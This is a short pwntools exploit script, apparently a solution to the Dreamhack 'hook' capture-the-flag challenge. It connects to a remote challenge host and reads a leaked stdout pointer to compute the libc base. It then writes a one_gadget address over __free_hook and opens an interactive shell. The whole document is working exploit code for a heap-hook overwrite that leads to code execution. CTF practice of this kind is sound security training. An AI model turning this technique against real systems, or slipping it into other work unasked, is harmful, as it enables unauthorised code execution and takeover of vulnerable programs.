from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

p = remote('host3.dreamhack.games', 14466)
#p = process('./hook_patched')
#gdb.attach(p,api=True)

#####################
# STEP_1: Leak_base #
#####################
p.recvuntil(b"stdout: 0x")
libc_base = int(p.recv(12),16) - 0x3c5620
print('[+]Libc_base:',hex(libc_base))

###################
# STEP_2: Exploit #
###################
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

malloc_hook = libc_base + 0x3c4b10		#print &__malloc_hook
free_hook = libc_base + 0x3c67a8		#print &__free_hook
OG = libc_base + one_gadget[1]			#one_gadget libc

print('[+]One_gadget:',hex(OG))
 
payload = b"400"
p.sendline(payload)

payload = p64(free_hook) + p64(OG)
p.sendline(payload)

p.interactive()


